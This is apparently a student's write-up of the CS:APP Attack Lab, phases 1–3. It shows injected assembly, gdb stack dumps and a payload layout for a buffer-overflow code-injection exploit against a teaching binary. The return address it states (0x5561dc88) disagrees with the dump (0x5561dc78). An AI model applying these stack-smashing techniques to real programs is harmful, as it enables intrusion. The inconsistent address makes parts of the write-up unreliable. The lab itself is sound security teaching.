## Attack Lab
### Phase 1:
No new code is injected. Overflow the buffer to redirect execution into `touch1()`.

### Phase 2:
Redirect execution into injected in the buffer, to modify argument (%rdi) to cookie:
```
movq $0x59b997fa, %rdi
```
Also, PUSH address of `touch2()` into stack (which also decrements %esp):
```
push $0x004017ec        # Address of touch2()
```
After executing RET, `touch2()` is executed.

## Phase 3:
Phase 3 is similar to phase 2, except that additional space is needed in stack to store cookie in ASCII. The stack before executing `getbuf()` has the following layout:
```
(gdb) x /20w 0x5561dc78
0x5561dc78:	0x00000000	0x00000000	0x00000000	0x00000000
0x5561dc88:	0x00000000	0x00000000	0x00000000	0x00000000
0x5561dc98:	0x55586000	0x00000000	0x00401976	0x00000000
0x5561dca8:	0x00000002	0x00000000	0x00401f24	0x00000000
0x5561dcb8:	0x00000000	0x00000000	0xf4f4f4f4	0xf4f4f4f4
```
The stack after executing `getbuf()` has the following layout:
```
(gdb) x /20w 0x5561dc78
0x5561dc78:	0x60dcb8bf	0x2534ff55	0x004018fa	0x000000c3
0x5561dc88:	0x00000000	0x00000000	0x00000000	0x00000000
0x5561dc98:	0x00000000	0x00000000	0x5561dc78	0x00000000
0x5561dca8:	0x00000002	0x00000000	0x00401f24	0x00000000
0x5561dcb8:	0x39623935	0x61663739	0xf4f4f400	0xf4f4f4f4
```
Where:
* 0x5561dc78 - 0x5561dc9f is the `getbuf()` buffer, which will be injected with instructions:
    ```
    movq $0x5561dcb8, %rdi
    push $0x4018fa          # Address of touch3()
    ret
    ```
* 0x5561dca0 - 0x5561dca7 will be overflowed with address of 0x5561dc88 (to redirect the execution into injected after hitting RET of `getbuf()`
* 0x5561dcb8 - 0x5561dcbf is empty, in which we fill in the cookie in ASCII.
* Others: Should not be modified.  

Overflow the buffer as described above.  
